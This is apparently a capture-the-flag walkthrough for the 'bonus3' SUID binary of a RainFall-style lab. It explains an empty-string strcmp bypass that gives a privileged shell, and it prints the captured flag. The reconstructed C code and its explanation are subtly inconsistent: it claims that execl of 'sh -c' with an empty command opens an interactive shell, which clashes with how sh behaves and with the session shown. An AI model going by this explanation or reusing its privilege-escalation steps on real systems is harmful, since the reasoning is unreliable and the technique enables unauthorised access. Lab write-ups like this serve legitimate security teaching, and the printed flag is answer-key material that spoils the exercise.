# Bonus3 Walkthrough - Empty String Bypass Exploitation

## Binary Analysis
- **Target**: `/home/user/bonus3/bonus3`
- **SUID**: Set for user 'end' (privilege escalation target)
- **Goal**: Escalate to 'end' user and read `/home/user/end/.pass`
- **Vulnerability**: String comparison bypass through controlled null termination

## Program Behavior Analysis

From disassembly analysis and testing, the program:

1. **Opens `/tmp/bonus3` file** for reading
2. **Requires exactly 2 arguments** (`argc == 2`)
3. **Reads 66 bytes** into buffer1 from file
4. **Uses `atoi(argv[1])`** as index to null-terminate buffer1
5. **Compares buffer1 with argv[1]** using `strcmp`
6. **Conditional execution**:
   - If `strcmp(buffer1, argv[1]) == 0`: executes `execl("/bin/sh", "sh", "-c", argv[1], NULL)`
   - Else: prints second buffer content

## Key Vulnerability

The vulnerability is in the string manipulation logic:
```c
index = atoi(argv[1]);        // Convert argument to integer
buffer1[index] = '\0';        // Null-terminate at user-controlled position
if (strcmp(buffer1, argv[1]) == 0) {
    execl("/bin/sh", "sh", "-c", argv[1], NULL);  // PRIVILEGE ESCALATION
}
```

## Working Exploitation Method - Empty String Bypass

### The Solution That Worked:
```bash
# Step 1: Create /tmp/bonus3 (content doesn't matter!)
touch /tmp/bonus3          # Empty file works
# OR: echo "anything" > /tmp/bonus3    # Any content works too

# Step 2: Run with empty string argument  
./bonus3 ""
```

### Why This Works - Detailed Execution Flow:

1. **File Creation**: `/tmp/bonus3` (content irrelevant - can be empty or anything)
2. **Program Execution**: `./bonus3 ""` (empty string argument)  
3. **Inside Program Logic**:
   ```c
   fread(buffer1, 1, 66, file);     // buffer1 = whatever file contains OR nothing if empty
   index = atoi("");                // atoi("") ALWAYS returns 0
   buffer1[0] = '\0';               // ALWAYS makes buffer1 = "" (overwrites first byte!)
   strcmp("", "");                  // ALWAYS returns 0 (SUCCESS!)
   execl("/bin/sh", "sh", "-c", "", NULL);  // Spawns shell with SUID privileges
   ```

4. **Result**: Shell spawned with 'end' user privileges

**Key Insight**: The `buffer1[0] = '\0'` line **overwrites** whatever was read from the file, making the file content completely irrelevant to the exploitation!

### Execution Results:
```bash
bonus3@RainFall:~$ echo "test" > /tmp/bonus3
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ id
uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

## Why Other Methods Don't Work

### Method 2: Self-Referential Numbers
```bash
echo "0" > /tmp/bonus3
./bonus3 "0"
# Problem: execl("/bin/sh", "sh", "-c", "0", NULL) tries to execute "0" as command
```

### Method 3: Command Injection Attempts
```bash  
echo "/bin/sh" > /tmp/bonus3
./bonus3 "7"
# Problem: strcmp("/bin/sh", "7") fails because strings don't match
```

## The Genius of Empty String Bypass

The empty string method works because:
- **Same value used twice**: Both argv[1] and resulting buffer1 are empty strings
- **atoi() behavior**: `atoi("")` reliably returns 0
- **Null termination**: `buffer1[0] = '\0'` creates empty string regardless of file content
- **String comparison**: `strcmp("", "")` always returns 0 (equal)
- **Shell execution**: `execl()` with empty command still spawns interactive shell

## Final Result

**Flag Extracted**: `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`

**Privilege Escalation Confirmed**:
- Original user: bonus3 (uid=2013)
- Escalated to: end (euid=2014)
- SUID binary exploitation successful

## Summary

Bonus3 demonstrates a **string comparison bypass vulnerability** where:
1. User controls both file content AND command argument
2. `atoi()` conversion creates controllable index for null termination
3. Empty string input creates identical comparison values
4. Successful comparison triggers privileged shell execution
5. SUID binary grants access to target user's files

This challenge teaches the importance of:
- Input validation in privileged programs
- Secure string handling and comparison logic
- Understanding `atoi()` edge cases with non-numeric input